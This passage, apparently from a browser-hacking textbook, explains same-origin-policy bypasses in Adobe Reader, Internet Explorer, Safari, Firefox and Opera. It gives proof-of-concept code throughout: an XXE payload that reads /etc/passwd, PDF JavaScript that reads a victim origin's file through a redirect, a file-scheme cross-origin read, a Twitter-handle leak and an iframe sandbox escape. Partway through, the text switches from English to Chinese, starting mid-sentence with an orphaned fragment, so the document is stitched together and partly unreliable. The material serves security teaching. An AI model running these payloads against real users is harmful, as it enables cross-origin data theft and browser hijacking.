
The widespread presence of the Java plugin makes it a perfect target for attackers. Eric Romang summarized a time line of Java zero days that led to arbitrary code execution, as displayed in Figure 4-2.10 Whilst these are not SOP bypasses, the time line is suggestive of what you can expect in the future.

## Bypassing SOP in Adobe Reader

Adobe Reader is infamous for the number of security bugs that have been found in its browser plugin. There is a seemingly countless number of arbitrary code execution bugs caused by such classical problems as overflows and Use After Free vulnerabilities.11 Attacking Adobe Reader more directly will be covered in the “Attacking PDF Readers” section of Chapter 8, but it’s important to understand how flaws within the plugin can help bypass the SOP.

As you may know, the Adobe Reader PDF parser understands JavaScript.12 This attribute is often used by malware to hide malicious code inside PDFs.

One of these flaws that allowed for the bypassing of the SOP is `CVE-2013-0622`, discovered by Billy Rios, Federico Lanusse, and Mauro Gentile. The attack (now patched in Adobe Reader versions greater than 11.0.0) was similar to the second SOP bypass discussed previously in the Java section, where exploiting an open redirect would allow a foreign origin to access the origin of the redirect. Similar to this attack, a request that returns a 302 redirect response code is used to exploit the vulnerability. Another interesting aspect of the bug is that the SOP was not enforced when specifying a resource using an XML External Entity (XXE).

Conventional XXE injection involves trying to inject malicious payloads into requests that accept XML input, such as the following:

```
<!DOCTYPE foo [  
<!ELEMENT foo ANY > 
<!ENTITY xxe SYSTEM "/etc/passwd" >]><foo>&xxe;</foo>
```

If the XML parser allows external entities, the value of `&xxe;`, is then replaced with the contents of `/etc/passwd`. The same technique can be used to bypass the SOP. It involves loading (as an external entity) the resource and the server replying with a 302 redirect. The real resource you want to retrieve is the target of the redirection. Consider the following JavaScript code snippet, which is contained in a PDF file:

```
var xml="<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY> <! ENTITY xxe 
SYSTEM \"http://browserhacker.com?redirect=
http%3A%2F%2Fbrowservictim.com%2Fdocument.txt\">]>
<foo>&xxe;</foo>";
var xdoc = XMLData.parse(xml,false);
app.alert(escape(xdoc.foo.value));
```

When the PDF is loaded, the preceding JavaScript code is executed. A GET request is sent to `browserhacker.com`, which replies with an HTTP 302 response, redirecting to the value of the `redirect` parameter. This results in `document.txt` (from `browservictim.com`) being retrieved and parsed.

The origin of `http://browserhacker.com` should not have access to content in the `http://browservictim.com` origin. This is clearly a security flaw of the Adobe Reader SOP implementation, because only resources from the same-origin where the PDF was loaded from should be read. In this case, you’re reading a resource from a different origin than the one where the PDF was loaded. Exploiting this bug has a limitation, though, which can be generally applied to XXE injection bugs. The resource to be retrieved needs to be either a plain or XML document type; otherwise, the XML parser will throw an error.

- 引入了一个重要问题，因为它创建了从 HTTP 到 HTTPS 的桥梁。如果你能通过 HTTP 传入恶意内容，它将能够访问（可能包含敏感信息的）通过 HTTPS 保护的内容。

## 绕过 Internet Explorer 的 SOP

Internet Explorer 也并未能幸免于 SOP 绕过的困扰。一个例子是 Internet Explorer 版本低于 8 Beta 2（包括 IE 6 和 7）的情况。这些浏览器版本在实现 `document.domain` 时存在一个 SOP 绕过漏洞 14，该漏洞的利用非常简单，正如 Gareth Heyes 所示 15。漏洞的核心在于覆盖 `document` 对象，然后覆盖其 `domain` 属性。

下面的代码片段演示了该漏洞：

```
var document; 
document = {}; 
document.domain = 'browserhacker.com'; 
alert(document.domain);
```

如果你在最新的浏览器中运行这段代码，你会在 JavaScript 控制台中看到 SOP 违规错误。但它在旧版本的 Internet Explorer 中会正常工作。通过利用这段代码作为 XSS 的一部分，你可以打开 SOP，从而与其他来源建立双向通信。

## 绕过 Safari 的 SOP

在 SOP 内部，不同的方案被视为不同的来源。因此 `http://localhost` 被视为与 `file://localhost` 为不同的来源。理所当然地，人们会认为 SOP 在所有方案中都得到同等执行。然而，如本节所示，文件方案（file scheme）存在几个值得注意的例外，它通常被认为是受信任的区域。

Safari 浏览器从 200716 到当前（截至本文撰写时）的 6.0.2 版本，在访问本地资源时不强制执行 SOP。如果你在 Safari 中获得了 JavaScript 执行权限，你可以诱骗用户下载并打开一个本地文件。结合这个漏洞与精心构造的社交工程邮件（附带恶意 HTML 文件），就足以利用这一情况。当附带的 HTML 文件使用 `file` 方案打开时，其中的 JavaScript 代码可以绕过 SOP，并与不同来源建立双向通信。请参考以下页面：

```
<html>
<body>
 <h1> I'm a local file loaded using the file:// scheme </h1>
<script>

xhr = new XMLHttpRequest();
xhr.onreadystatechange = function () {
  if (xhr.readyState == 4) {
    alert(xhr.responseText);
  }
};
xhr.open("GET",
"http://browserhacker.com/pocs/safari_sop_bypass/different_orig.html");
xhr.send();
</script>
</body>
</html>
```

当页面使用 `file` 方案加载时，`XMLHttpRequest` 对象能够读取 `different_orig.html` 从 `browserhacker.com` 的响应。在 Figure 4-3 中，你可以看到这种行为的结果，其中检索到的页面内容被添加到警告对话框中。

start figure 

**Figure 4-3:** 当 JavaScript 代码使用 `file:` 方案加载时，跨来源资源的内容会被正确检索。

![c04f003.tif](img/c04f003.png)

end figure 

相反，如果你使用不同的方案加载同一页面，例如 `http`，你会发现警告对话框是空的。

## 绕过 Firefox 的 SOP

2012 年 10 月，Gareth Heyes 发现了 Firefox 中一个更有趣的 SOP 绕过漏洞 17。该漏洞非常严重，以至于 Mozilla 决定在修复之前暂停 Firefox 16 的下载，直到问题解决 18。如前所述，之前的版本未受影响，因此可以推测该漏洞是作为升级的一部分引入的，但在 Firefox 16 的回归测试中未被发现。该漏洞导致未经授权访问 `window.location` 对象，超出了 SOP 的限制。以下是 Heyes 提供的原始 Proof of Concept (PoC)：

```
<!doctype html>
<script>
function poc() {
  var win = window.open('https://twitter.com/lists/', 'newWin',
'width=200,height=200');
  setTimeout(function(){
    alert('Hello '+/^https:\/\/twitter.com\/([^/]+)/.exec(
            win.location)[1])
  }, 5000);
}
</script>
<input type=button value="Firefox knows" onclick="poc()">
```

如果你在受控的来源（例如 `browserhacker.com`) 执行上述代码，同时在另一个标签中登录 Twitter，将触发该攻击。它会打开一个新窗口加载 `https://twitter.com/lists`，Twitter 会自动跳转到 `https://twitter.com/<user_uid>/lists`（其中 `user_id` 是你的 Twitter 处理名）。5 秒后，`exec` 函数会触发 `window.location` 对象的解析（这里是漏洞所在，因为它不应该跨来源访问），从而显示 Twitter 处理名在弹窗中。

start feature 

* * *

**Sandboxed IFrames** HTML5 引入了新的 IFrame 属性：`sandbox`。其目的是提供一种更细粒度和更安全的使用 IFrames 的方式，同时限制第三方内容从不同来源嵌入时的潜在危害。`sandbox` 属性的值可以是以下关键词的组合：`allow-forms`、`allow-popups`、`allow-same-origin`、`allow-scripts` 和 `allow-top-navigation`。

* * *

end feature 

2012 年 8 月，Firefox 开始支持 HTML5 sandboxed IFrames。Braun 发现，当使用 `allow-scripts` 作为 IFrame `sandbox` 属性的值时，IFrame 内容中的恶意 JavaScript 仍然可以访问 `window.top`。这使得修改外层窗口的位置成为可能：

```
<!-- Outer file, bearing the sandbox -->
<iframe src="inner.html" sandbox="allow-scripts"></iframe>
```

被嵌入的代码是：

```
<!-- Framed document , inner.html -->
<script >
// escape sandbox:
if(top != window) { top.location = window.location; }
 // all following JavaScript code and markup is unrestricted:
 plugins, popups and forms allowed.
</script>
```

这可以在不指定额外的 `allow-top-navigation` 关键词的情况下完成，使得加载在 IFrame 中的 JavaScript 代码能够修改外层窗口的位置。攻击者可以利用此技巧将用户重定向到恶意网站，从而钩住受害者浏览器。

## 绕过 Opera 的 SOP

如果你查看 Opera 稳定版 12.10 的变更日志 19，会发现多个安全漏洞修复。其中一个补丁 20 是 Heyes 发现的 SOP 绕过漏洞。该漏洞利用了 Opera 在重写 IFrame 位置对象构造函数原型时未能正确执行 SOP。请参考以下代码：

```
<html>
<body>
<iframe id="ifr" src="http://browservictim.com/xdomain.html"></iframe>
<script>
var iframe = document.getElementById('ifr');
function do_something(){
 var iframe = document.getElementById('ifr');
 iframe.contentWindow.location.constructor.
  prototype.__defineGetter__.constructor('[].constructor.
  prototype.join=function(){console.log("pwned")}')();
}
setTimeout("do_something()",3000);
</script>
</body>
</html>
```

下面是来自不同来源的框架内容：

```
<html>
<body>
<b>I will be framed from a different origin</b>
<script>
function do_join(){
 [1,2,3].join();
 console.log("join() after prototype override: "
 + [].constructor.prototype.join);
}
console.log("join() after prototype override: " 
 + [].constructor.prototype.join);
setTimeout("do_join();", 5000);
</script>
</body>
</html>
```
